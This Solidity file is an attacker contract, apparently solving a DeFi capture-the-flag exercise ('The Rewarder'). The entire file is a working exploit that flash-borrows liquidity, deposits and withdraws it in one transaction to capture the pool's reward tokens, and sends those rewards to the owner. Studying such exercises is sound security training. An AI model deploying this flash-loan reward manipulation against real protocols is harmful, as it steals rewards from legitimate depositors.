// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract MiniAttacker {
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanerPool;
    address owner;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _owner
    ) {
        rewarderPool = TheRewarderPool(_rewarderPool);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        owner = _owner;
    }

    function attack() external {
        flashLoanerPool.flashLoan(1_000_000 ether);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanerPool), "blabla");

        IERC20(flashLoanerPool.liquidityToken()).approve(
            address(rewarderPool),
            amount
        );

        rewarderPool.deposit(amount);

        rewarderPool.withdraw(amount);

        IERC20(flashLoanerPool.liquidityToken()).transfer(
            address(flashLoanerPool),
            amount
        );

        uint256 balance = IERC20(rewarderPool.rewardToken()).balanceOf(
            address(this)
        );
        IERC20(rewarderPool.rewardToken()).transfer(owner, balance);
    }
}
